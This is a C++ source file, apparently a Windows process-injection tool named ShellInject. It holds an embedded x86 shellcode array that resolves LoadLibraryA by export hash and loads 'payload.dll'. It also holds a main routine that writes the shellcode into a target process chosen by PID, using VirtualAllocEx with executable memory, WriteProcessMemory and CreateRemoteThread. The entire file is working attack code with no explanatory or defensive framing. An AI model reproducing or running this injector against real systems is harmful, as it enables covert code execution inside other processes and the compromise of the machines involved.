// ShellInject.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <cstdio>
#include <stdint.h>
#include <Windows.h>


int main(int argc, char *argv[])
{
	const uint8_t data[468] =
	{
		0x8b, 0xec, 0x8d, 0x64, 0x24, 0xf0, 0xe8, 0x00, 0x00, 0x00, 0x00, 0x58, 0x8d, 0x40, 0xf5, 0x89,
		0x45, 0xf8, 0x8b, 0x45, 0xf8, 0x8d, 0x80, 0xb0, 0x01, 0x00, 0x00, 0x89, 0x45, 0xf0, 0x6a, 0x00,
		0x8f, 0x45, 0xf4, 0x8b, 0x45, 0xf8, 0x8d, 0x80, 0xb8, 0x01, 0x00, 0x00, 0x8d, 0x18, 0x8d, 0x75,
		0xf0, 0xeb, 0x22, 0x8b, 0x45, 0xf8, 0x8d, 0x80, 0xc8, 0x01, 0x00, 0x00, 0x50, 0x8b, 0x45, 0xf8,
		0x8d, 0x80, 0xb0, 0x01, 0x00, 0x00, 0xff, 0x50, 0x04, 0x50, 0x8b, 0x45, 0xf8, 0x8d, 0x88, 0xb0,
		0x01, 0x00, 0x00, 0xff, 0x11, 0x8b, 0x06, 0x83, 0xf8, 0x00, 0x74, 0xd7, 0x8b, 0xc3, 0x83, 0xc3,
		0x04, 0x8b, 0x00, 0x89, 0x45, 0xfc, 0x33, 0xff, 0x8b, 0x0b, 0x8b, 0x45, 0xfc, 0x8b, 0xd1, 0xe8,
		0x1f, 0x00, 0x00, 0x00, 0x8b, 0xd0, 0x83, 0xfa, 0x00, 0x74, 0x02, 0xeb, 0x05, 0x83, 0xc6, 0x04,
		0xeb, 0xd3, 0x8b, 0x06, 0x8b, 0xcf, 0x83, 0xc7, 0x01, 0x8d, 0x04, 0x88, 0x89, 0x10, 0x83, 0xc3,
		0x04, 0xeb, 0xd5, 0x53, 0x56, 0x57, 0x55, 0x8b, 0xec, 0x8d, 0x64, 0x24, 0xf0, 0x89, 0x45, 0xf8,
		0x89, 0x55, 0xfc, 0x64, 0xa1, 0x30, 0x00, 0x00, 0x00, 0x8b, 0x40, 0x0c, 0x8b, 0x48, 0x0c, 0x8b,
		0x41, 0x18, 0x83, 0xf8, 0x00, 0x74, 0x0d, 0xeb, 0x04, 0x8b, 0x09, 0xeb, 0xf2, 0x33, 0xd2, 0x66,
		0x33, 0xdb, 0xeb, 0x07, 0x33, 0xc0, 0xc9, 0x5f, 0x5e, 0x5b, 0xc3, 0x66, 0x8b, 0x41, 0x2c, 0x66,
		0x3b, 0xd8, 0x72, 0x08, 0xeb, 0x26, 0x66, 0x83, 0xc3, 0x02, 0xeb, 0xef, 0x8b, 0xf2, 0xc1, 0xee,
		0x0d, 0xc1, 0xe2, 0x13, 0x0b, 0xf2, 0x8b, 0xd6, 0x8b, 0x41, 0x30, 0x0f, 0xb7, 0xf3, 0x03, 0xc6,
		0x8a, 0x00, 0x0f, 0xbe, 0xc0, 0x83, 0xf8, 0x61, 0x72, 0x12, 0xeb, 0x09, 0x8b, 0x45, 0xf8, 0x3b,
		0xc2, 0x74, 0x0d, 0xeb, 0xb4, 0x83, 0xe8, 0x20, 0x03, 0xd0, 0xeb, 0xca, 0x03, 0xd0, 0xeb, 0xc6,
		0x8b, 0x59, 0x18, 0x8b, 0x43, 0x3c, 0x8b, 0xd3, 0x03, 0xd0, 0x8b, 0x42, 0x78, 0x8b, 0xd3, 0x03,
		0xd0, 0x8b, 0xc2, 0x89, 0x45, 0xf4, 0x33, 0xd2, 0x8b, 0x45, 0xf4, 0x8b, 0x40, 0x18, 0x3b, 0xd0,
		0x72, 0x07, 0xeb, 0x85, 0x83, 0xc2, 0x01, 0xeb, 0xef, 0x8b, 0x45, 0xf4, 0x8b, 0x40, 0x20, 0x8b,
		0xf3, 0x03, 0xf0, 0x8b, 0xc6, 0x8d, 0x04, 0x90, 0x8b, 0x00, 0x8b, 0xfb, 0x03, 0xf8, 0x33, 0xf6,
		0x8b, 0xc7, 0x83, 0xc7, 0x01, 0x8a, 0x00, 0x0f, 0xbe, 0xc0, 0x89, 0x45, 0xf0, 0x8b, 0x45, 0xf0,
		0x83, 0xf8, 0x00, 0x74, 0x02, 0xeb, 0x09, 0x8b, 0x45, 0xfc, 0x3b, 0xc6, 0x74, 0x15, 0xeb, 0xc4,
		0x8b, 0xc6, 0xc1, 0xe8, 0x0d, 0xc1, 0xe6, 0x13, 0x0b, 0xc6, 0x8b, 0xf0, 0x8b, 0x45, 0xf0, 0x03,
		0xf0, 0xeb, 0xcd, 0x8b, 0x45, 0xf4, 0x8b, 0x40, 0x1c, 0x8b, 0xcb, 0x03, 0xc8, 0x8b, 0x45, 0xf4,
		0x8b, 0x40, 0x24, 0x8b, 0xf3, 0x03, 0xf0, 0x8b, 0xc6, 0x8d, 0x04, 0x50, 0x66, 0x8b, 0x00, 0x0f,
		0xb7, 0xc0, 0x8d, 0x04, 0x81, 0x8b, 0x00, 0x03, 0xd8, 0x8b, 0xc3, 0xc9, 0x5f, 0x5e, 0x5b, 0xc3,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x17, 0xca, 0x2b, 0x6e, 0x7e, 0xd8, 0xe2, 0x73,
		0x8e, 0x4e, 0x0e, 0xec, 0x00, 0x00, 0x00, 0x00, 0x70, 0x61, 0x79, 0x6c, 0x6f, 0x61, 0x64, 0x2e,
		0x64, 0x6c, 0x6c, 0x00
	}; //LoadLibraryA KBDUS.dll


	HANDLE processHandle;
	HANDLE remoteThread;
	PVOID remoteBuffer;
	if (argc < 2) {
		printf("Usage: ./ShellInject.exe PID\n");
		return 0;
	}

	printf("Injecting to PID %i", atoi(argv[1]));
	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof(data), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(processHandle, remoteBuffer, data, sizeof(data), NULL);
	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	CloseHandle(processHandle);

}